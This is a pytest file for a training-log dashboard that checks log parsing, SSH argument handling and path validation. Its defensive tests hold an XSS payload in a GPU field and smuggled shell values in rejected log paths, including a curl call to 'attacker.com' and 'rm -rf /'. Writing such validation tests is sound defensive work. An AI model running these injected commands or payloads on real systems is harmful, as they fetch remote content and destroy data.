"""Tests for dashboard.py parse_log and utility functions."""
import sys
from pathlib import Path

# Add parent dir so we can import dashboard
sys.path.insert(0, str(Path(__file__).parent.parent))
from dashboard import parse_log, _parse_ssh_string, _extract_ssh_host, _SAFE_LOG_PATH

FIXTURES = Path(__file__).parent / "fixtures"


def _load(name: str) -> str:
    return (FIXTURES / name).read_text()


# ---------------------------------------------------------------------------
# parse_log: complete run
# ---------------------------------------------------------------------------
class TestParseLogComplete:
    def setup_method(self):
        self.d = parse_log(_load("train_complete.log"))

    def test_config_parsed(self):
        assert self.d["config"]["gpu"] == "NVIDIA H100 80GB HBM3"
        assert self.d["config"]["world_size"] == "8"
        assert self.d["config"]["max_wallclock"] == 600.0
        assert self.d["config"]["iterations"] == 20000
        assert self.d["config"]["seed"] == "42"

    def test_steps_parsed(self):
        assert len(self.d["steps"]) >= 4
        assert self.d["steps"][0] == 50

    def test_val_bpb_parsed(self):
        assert len(self.d["val_bpb"]) >= 4
        assert self.d["val_bpb"][-1] == 1.1973

    def test_phase_switches(self):
        assert len(self.d["phase_switches"]) == 2
        assert self.d["phase_switches"][0] == [1500, 3]
        assert self.d["phase_switches"][1] == [2500, 4]

    def test_swa(self):
        assert self.d["swa_count"] == 44

    def test_finals(self):
        assert self.d["finals"]["roundtrip"] == 1.1987
        assert self.d["finals"]["sliding"] == 1.1960
        assert self.d["finals"]["hedge"] == 1.1441
        assert self.d["finals"]["artifact_bytes"] == 15234567

    def test_eval_times(self):
        assert self.d["finals"]["rt_time"] == 45000
        assert self.d["finals"]["sw_time"] == 120000
        assert self.d["finals"]["hm_time"] == 162000

    def test_status_done(self):
        assert self.d["status"] == "done"

    def test_chi_parsed(self):
        assert len(self.d["chi_steps"]) >= 1
        assert self.d["chi_vals"][0] == 3.1

    def test_peak_mem(self):
        assert "72.3 GiB" in self.d["peak_mem"]


# ---------------------------------------------------------------------------
# parse_log: crashed run
# ---------------------------------------------------------------------------
class TestParseLogCrashed:
    def setup_method(self):
        self.d = parse_log(_load("train_crashed.log"))

    def test_status_crashed(self):
        assert self.d["status"] == "crashed"

    def test_error_excerpt(self):
        assert "CUDA out of memory" in self.d.get("error_excerpt", "")

    def test_steps_before_crash(self):
        assert len(self.d["steps"]) >= 2


# ---------------------------------------------------------------------------
# parse_log: warmup only
# ---------------------------------------------------------------------------
class TestParseLogWarmup:
    def setup_method(self):
        self.d = parse_log(_load("train_warmup.log"))

    def test_status_warmup(self):
        assert self.d["status"] == "warmup"

    def test_warmup_progress(self):
        assert self.d["warmup_cur"] == 25
        assert self.d["warmup_total"] == 50

    def test_no_steps(self):
        assert len(self.d["steps"]) == 0


# ---------------------------------------------------------------------------
# parse_log: empty
# ---------------------------------------------------------------------------
def test_parse_empty():
    d = parse_log("")
    assert d["status"] == "warmup"
    assert len(d["steps"]) == 0
    assert len(d["val_bpb"]) == 0


# ---------------------------------------------------------------------------
# parse_log: GPU XSS sanitization
# ---------------------------------------------------------------------------
def test_gpu_xss_sanitized():
    log = 'gpu:<img/src=x/onerror=alert(1)>  world_size:8'
    d = parse_log(log)
    gpu = d["config"].get("gpu", "")
    assert "<" not in gpu
    assert ">" not in gpu


# ---------------------------------------------------------------------------
# SSH helpers
# ---------------------------------------------------------------------------
class TestSSHParsing:
    def test_simple_host(self):
        args = _parse_ssh_string("root@10.0.0.1")
        assert args[0] == "ssh"
        assert "root@10.0.0.1" in args
        assert "StrictHostKeyChecking=accept-new" in " ".join(args)

    def test_host_with_port(self):
        args = _parse_ssh_string("root@10.0.0.1 -p 22222")
        assert "root@10.0.0.1" in args
        assert "-p" in args
        assert "22222" in args

    def test_insecure_mode(self):
        args = _parse_ssh_string("root@host", insecure=True)
        assert "StrictHostKeyChecking=no" in " ".join(args)

    def test_extract_host_simple(self):
        args = _parse_ssh_string("root@10.0.0.1")
        assert _extract_ssh_host(args) == "10.0.0.1"

    def test_extract_host_with_port(self):
        args = _parse_ssh_string("root@10.0.0.1 -p 22222")
        assert _extract_ssh_host(args) == "10.0.0.1"

    def test_extract_host_no_user(self):
        args = _parse_ssh_string("10.0.0.1 -p 22222")
        assert _extract_ssh_host(args) == "10.0.0.1"

    def test_extract_host_with_key(self):
        args = _parse_ssh_string("root@10.0.0.1 -p 22222 -i /path/to/key")
        assert _extract_ssh_host(args) == "10.0.0.1"


# ---------------------------------------------------------------------------
# Safe log path validation
# ---------------------------------------------------------------------------
class TestSafeLogPath:
    def test_valid_paths(self):
        assert _SAFE_LOG_PATH.match("/workspace/train.log")
        assert _SAFE_LOG_PATH.match("/workspace/subdir/run_42.log")
        assert _SAFE_LOG_PATH.match("/tmp/my-run.log")

    def test_invalid_paths(self):
        assert not _SAFE_LOG_PATH.match("$(curl attacker.com).log")
        assert not _SAFE_LOG_PATH.match("/workspace/$(whoami).log")
        assert not _SAFE_LOG_PATH.match("; rm -rf /;.log")
        assert not _SAFE_LOG_PATH.match("/workspace/test.txt")  # not .log
